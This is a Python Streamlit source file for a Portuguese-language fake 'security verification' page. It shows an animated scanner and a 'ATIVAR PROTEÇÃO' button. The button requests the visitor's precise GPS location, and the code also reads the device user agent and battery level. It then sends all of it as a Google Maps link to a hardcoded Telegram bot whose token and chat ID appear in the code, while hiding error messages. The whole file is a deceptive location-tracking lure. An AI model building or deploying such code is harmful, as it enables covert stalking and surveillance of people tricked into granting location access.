import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval

# 1. SETUP TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Segurança", layout="centered")

# 2. CSS: BOLHA + ESTILO DA BARRA AMARELA (IGUAL À FOTO)
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
    
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }

    /* ESTILO DA BARRA AMARELA COMPRIDA ABAIXO DOS CHECKBOXES */
    .btn-barra {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 55px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
        margin-top: 20px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

# Bolha inicial em 4%
if 'progresso' not in st.session_state: st.session_state['progresso'] = 4

with caixa_bolha.container():
    st.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{st.session_state["progresso"]}%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 4. O SEGREDO: BOTÃO EM HTML/JS PARA ABRIR O POP-UP DA FOTO
# Esse código força o navegador a pedir "Precisão de Local"
html_gps = """
<script>
function abrirGPS() {
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude, ok: true};
            window.parent.postMessage({type: 'streamlit:set_component_value', value: coords}, '*');
        },
        (err) => { 
            // Se o GPS estiver desligado, mostra o alerta que você viu
            alert("Por favor, ative a localização no seu GPS!");
        },
        {enableHighAccuracy: true}
    );
}
</script>
<button class="btn-barra" onclick="abrirGPS()">
    <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
</button>
"""

# Renderiza a barra amarela exatamente embaixo dos textos
dados_gps = st.components.v1.html(html_gps, height=100)

# 5. CAPTURA DE DADOS E ANIMAÇÃO
modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL_V5')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_V5')

if dados_gps and isinstance(dados_gps, dict) and dados_gps.get('ok'):
    # Os números giram agora na bolha
    for p in range(st.session_state['progresso'], 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    
    lat, lon = dados_gps['lat'], dados_gps['lon']
    mapa = f"https://www.google.com/maps?q={lat},{lon}"
    
    enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Modelo: {modelo[:50]}\n🔋 Bateria: {bateria}%\n📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})")
    st.success("Proteção Ativada!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
